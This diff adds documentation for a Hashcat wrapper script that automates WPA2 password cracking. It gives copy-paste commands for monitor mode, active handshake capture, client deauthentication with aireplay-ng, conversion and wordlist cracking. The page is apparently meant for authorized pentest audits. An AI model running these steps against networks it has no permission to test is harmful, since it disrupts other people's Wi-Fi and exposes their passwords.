@@ -1,0 +1,240 @@
+---
+title: "auto-crack-wpa2.sh: Automate WPA2 Handshake Cracking"
+sidebarTitle: "WPA2 Cracking"
+description: "auto-crack-wpa2.sh wraps Hashcat to automate WPA2 cracking from a .hc22000 or .pcapng file with GPU detection, wordlist resolution, and rule application."
+---
+
+`auto-crack-wpa2.sh` is a Hashcat wrapper that automates the most repetitive parts of WPA2 password recovery: locating wordlists, finding rules, detecting whether a GPU is available, converting `.pcapng` captures on the fly, and printing the cracked password if one is found. You point it at a handshake file, choose a mode, and it handles the rest — GPU acceleration, wordlist decompression, and potfile display included.
+
+<Warning>
+  This script is for **authorized security audits only**. Cracking WiFi networks without written permission from the owner is illegal in most jurisdictions. Use it only on your own network, networks you have explicit authorization to test, or dedicated practice platforms such as TryHackMe and HackTheBox.
+</Warning>
+
+---
+
+## Full WPA2 Cracking Workflow
+
+<Steps>
+  <Step title="Phase 0 — Hardware Preparation">
+    You need a USB WiFi adapter that supports **monitor mode** and **packet injection**. Most internal laptop cards do not support these features.
+
+    **Recommended adapters:**
+    - Alfa AWUS036NHA
+    - TP-Link TL-WN722N **v1** (v2/v3 do not support injection)
+    - Panda PAU09
+
+    Verify your adapter is recognized inside the container:
+    ```bash
+    lsusb
+    ```
+
+    Verify driver support for monitor mode:
+    ```bash
+    iw list | grep -A 10 "Supported interface modes"
+    # Must show "monitor" in the list
+    ```
+  </Step>
+
+  <Step title="Phase 1 — Capture the Handshake">
+    Launch the container in WPA2 mode (privileged, required for `hcxdumptool`):
+
+    ```bash
+    # On your HOST machine
+    ./run-kali.sh wpa2
+    ```
+
+    Inside the container, activate monitor mode on your USB adapter:
+
+    ```bash
+    setup-wifi.sh
+    # Note the monitor interface name printed at the end, e.g. wlan0mon
+    ```
+
+    Optionally scan nearby networks to identify your target channel:
+
+    ```bash
+    airodump-ng wlan0mon
+    # Press Ctrl+C when you have identified the target BSSID and channel
+    ```
+
+    Capture the handshake with `hcxdumptool` (replace `6` with your target channel):
+
+    ```bash
+    hcxdumptool -i wlan0mon -o /root/pentest/handshakes/captura.pcapng --active -c 6
+    # Press Ctrl+C after 30-60 seconds or when you see [1] HANDSHAKE
+    ```
+
+    <Tip>
+      If no handshake appears, send deauthentication frames to force a client reconnection:
+      ```bash
+      aireplay-ng --deauth 10 -a [BSSID] wlan0mon
+      ```
+      Wait a few seconds, then restart the capture.
+    </Tip>
+  </Step>
+
+  <Step title="Phase 2 — Convert the Capture">
+    Convert the raw `.pcapng` to Hashcat's native `.hc22000` format:
+
+    ```bash
+    hcxpcapngtool -o /root/pentest/handshakes/captura.hc22000 \
+                  /root/pentest/handshakes/captura.pcapng
+    ```
+
+    The output should report at least one WPA pair recovered:
+
+    ```
+    WPA pairs recovered................: 1
+    WPA pairs written to file..........: 1
+    ```
+
+    <Note>
+      If the count is `0`, no usable handshake was captured. Return to Phase 1 and capture again — a full four-way handshake requires a client to (re)connect while you are listening.
+    </Note>
+  </Step>
+
+  <Step title="Phase 3 — Crack with auto-crack-wpa2.sh">
+    Run the script in quick mode (recommended starting point):
+
+    ```bash
+    auto-crack-wpa2.sh -q /root/pentest/handshakes/captura.hc22000
+    ```
+
+    The script automatically:
+    - Detects whether an NVIDIA GPU is available via `hashcat -I`
+    - Resolves the wordlist path, decompressing `.gz` files if needed
+    - Resolves the rule path from `/root/pentest/rules/` then `/usr/share/hashcat/rules/`
+    - Builds and executes the `hashcat -m 22000` command
+    - Displays the potfile contents when finished
+
+    If you pass a raw `.pcapng` file directly, the script converts it automatically before cracking:
+
+    ```bash
+    auto-crack-wpa2.sh -q /root/pentest/handshakes/captura.pcapng
+    # Converted .hc22000 is saved to /root/pentest/loot/
+    ```
+  </Step>
+
+  <Step title="Phase 4 — Read the Results">
+    Display any cracked passwords from Hashcat's potfile:
+
+    ```bash
+    hashcat -m 22000 /root/pentest/handshakes/captura.hc22000 --show
+    ```
+
+    Expected output when a password is found:
+
+    ```
+    WPA*01*4d4d021706b6*...:MyPassword123
+    ```
+
+    Save the results to the loot directory:
+
+    ```bash
+    hashcat -m 22000 /root/pentest/handshakes/captura.hc22000 --show \
+            > /root/pentest/loot/resultados.txt
+    ```
+  </Step>
+</Steps>
+
+---
+
+## Script Usage
+
+### Synopsis
+
+```bash
+auto-crack-wpa2.sh [-q] [-r <rule>] [-w <wordlist>] [-c] <file>
+```
+
+### Flags
+
+| Flag | Description | Default |
+|------|-------------|---------|
+| `-q` | Quick mode: `rockyou.txt` + `best64.rule` | — |
+| `-r <rule>` | Hashcat rule filename | `best64.rule` |
+| `-w <wordlist>` | Wordlist filename | `rockyou.txt` |
+| `-c` | Force CPU mode (`-D 1`) | GPU if available |
+| `<file>` | Input `.hc22000` or `.pcapng` file | required |
+
+<Note>
+  `-q` is a shorthand that sets both `-w rockyou.txt` and `-r best64.rule` simultaneously. Any `-w` or `-r` flags specified alongside `-q` are overridden by the quick-mode defaults because `-q` is processed last in the argument loop.
+</Note>
+
+---
+
+## Examples
+
+```bash
+# Quick mode (recommended first attempt)
+auto-crack-wpa2.sh -q /root/pentest/handshakes/captura.hc22000
+
+# Custom rule with default wordlist
+auto-crack-wpa2.sh -r d3ad0ne.rule -w rockyou.txt captura.hc22000
+
+# CPU mode (no GPU available)
+auto-crack-wpa2.sh -c -q captura.hc22000
+
+# From raw .pcapng (auto-converts to .hc22000 before cracking)
+auto-crack-wpa2.sh -q captura.pcapng
+```
+
+---
+
+## Complete One-Block Workflow
+
+Copy and paste this entire block inside a container launched with `./run-kali.sh wpa2`:
+
+```bash
+# 1. Activate monitor mode
+setup-wifi.sh
+
+# 2. Capture the handshake (replace wlan0mon if your interface name differs)
+hcxdumptool -i wlan0mon -o /root/pentest/handshakes/mired.pcapng --active
+# Press Ctrl+C after ~60 seconds or when you see [1] HANDSHAKE
+
+# 3. Convert to Hashcat format
+hcxpcapngtool -o /root/pentest/handshakes/mired.hc22000 \
+              /root/pentest/handshakes/mired.pcapng
+
+# 4. Crack with auto-crack-wpa2.sh
+auto-crack-wpa2.sh -q /root/pentest/handshakes/mired.hc22000
+
+# 5. Show the result
+hashcat -m 22000 /root/pentest/handshakes/mired.hc22000 --show
+```
+
+---
+
+## File Paths Inside the Container
+
+| Purpose | Path |
+|---------|------|
+| Handshake captures | `/root/pentest/handshakes/` |
+| Cracked passwords and results | `/root/pentest/loot/` |
+| Hashcat rule files | `/root/pentest/rules/` |
+| Custom wordlists | `/root/pentest/wordlists/` |
+| System wordlists (host mount) | `/host-wordlists/` |
+| Built-in Hashcat rules | `/usr/share/hashcat/rules/` |
+
+All paths under `/root/pentest/` map to the `./data/` directory on your host machine through the Docker volume mount, so captures and results persist after the container exits.
+
+---
+
+## Tips
+
+<Tip>
+  Always pass `-O` (optimized kernels) when running Hashcat directly. The script already includes `-O` and `-w 3` in its generated command for best performance on passwords under 32 characters.
+</Tip>
+
+1. **Always use `-O` with Hashcat** — optimized kernels are faster for passwords under 32 characters and are included by default in `auto-crack-wpa2.sh`.
+2. **Store captures in `/root/pentest/handshakes/`** — this directory is synced to `./data/handshakes/` on your host and survives container restarts.
+3. **Use larger wordlists when `rockyou.txt` fails** — try SecLists for a broader dictionary:
+   ```bash
+   auto-crack-wpa2.sh -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt captura.hc22000
+   ```
+4. **Layer rules on top of wordlists** — rule files mutate each candidate (capitalization, number suffixes, leet substitution). `d3ad0ne.rule` covers more mutations than `best64.rule` at the cost of more time.
+5. **Resume interrupted attacks** — Hashcat saves progress automatically and can pick up where it left off:
+   ```bash
+   hashcat -m 22000 captura.hc22000 --restore
+   ```
